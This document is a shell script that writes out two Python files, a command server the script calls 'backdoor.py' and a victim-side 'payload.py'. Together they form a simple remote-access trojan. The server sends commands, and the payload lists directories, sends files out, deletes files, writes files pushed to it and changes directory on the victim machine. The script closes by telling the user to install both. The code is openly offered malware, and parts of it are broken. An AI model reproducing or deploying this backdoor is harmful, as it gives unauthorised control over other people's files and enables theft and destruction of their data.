apt install python
clear
echo "import os
import socket

s = socket.socket()

host = socket.gethostname()

port = 8080

s.bind((host,port))
print("")
print(" Server is curretly running @ : ",host)
print("")
print(" Waiting for any incoming Connections...")
s.listen(1)

conn , addr = s.accept()
print("")
print(addr, "Has connected to the server successfully ")

while 1:
  command = input(str("Command>> "))
  if command == "file":
    conn.send(command.encode())
    files = conn.recv(1024)
    files = files.decode()
    print(files)
  elif command == "clear":
    os.system("clear")
  elif command == "dir":
     conn.send(command.encode())
     i = input("Custom dir : ")
     conn.send(i.encode())
     files = conn.recv(1024)
     files = files.decode()
     print(files)
  elif command == "move":
     conn.send(command.encode())
     filename = input(str("file : "))
     conn.send(filename.encode())
     print("Done..")
     file = conn.recv(10000)
     filepath = input(str("Enter Filename : "))
     new_file = open(filepath, "wb")
     new_file.write(file)
     new_file.close()
     print(filepath, "Done Move succesfully")
  elif command == "remove":
     conn.send(command.encode())
     fileanddir = input(str("Enter filename remove : "))
     conn.send(fileanddir.encode())
     print("Done.. Remove")
  elif command == "send":
     conn.send(command.encode())
     filer = input(str("Enter location file : "))
     filepor = input(str("Enter Filename send : "))
     date = open(filer, "rb")
     file_date = date.read(7000)
     conn.send(file_date)
     conn.send(date)
     print(filer, "Has been sent victem succesfully")
     conn.send(filepor.encode())
  elif command == "open":
     conn.send(command.encode())
     open = input(str("Enter a open folder : "))
     conn.send(open.encode())
     print("Done..")
  elif command == "ls":
     os.system("ls")" > backdoor.py
echo "  
import os
import socket

s = socket.socket()

port = 8080

host = "localhost"

s.connect((host,port))
print("")
print("Connected to the server successfully")
print("")

while 1:
  command = s.recv(1024)
  command = command.decode()
  if command == "file":
    files = os.getcwd()
    files = str(files)
    s.send(files.encode())
  elif command == "dir":
    user_input = s.recv(1024)
    user_input = user_input.decode()
    files = os.listdir(user_input)
    files = str(files)
    s.send(files.encode())
  elif command == "move":
    file_path = s.recv(5000)
    file_path = file_path.decode()
    file = open(file_path, "rb")
    date = file.read()
    s.send(date)
  elif command == "remove":
    fileanddir = s.recv(60000)
    fileanddir = fileanddir.decode()
    os.remove(fileanddir)
  elif command == "send":
    filename = s.recv(6000)
    new_file = open(filename, "wb")
    date = s.recv(6000)
    new_file.write(date)
    new_file.close()
  elif command == "open":
    open = s.recv(1024)
    open = open.decode()
    os.chdir(open)" > payload.py
echo "Done.. Now install backdoor and payload"
